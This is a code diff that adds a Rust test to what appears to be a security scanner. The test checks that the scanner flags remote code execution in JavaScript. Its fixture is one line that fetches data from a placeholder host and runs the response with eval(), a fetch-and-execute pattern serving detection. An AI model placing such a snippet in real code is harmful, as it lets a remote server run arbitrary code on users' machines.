@@ -656,6 +656,25 @@ fn websocket_message_callback_reaches_dynamic_execution() {
 }
 
 #[test]
+fn node_https_data_callback_reaches_dynamic_execution() {
+    let root = temporary_directory("https-response");
+    fs::write(root.join("main.js"), b"const https = require('https'); https.get('https://example.invalid/control', response => { response.on('data', chunk => eval(chunk.toString())); });").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
+                && finding["evidence"].to_string().contains("https.get"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn remote_bytes_written_then_spawned_are_correlated() {
     let root = temporary_directory("write-spawn");
     fs::write(
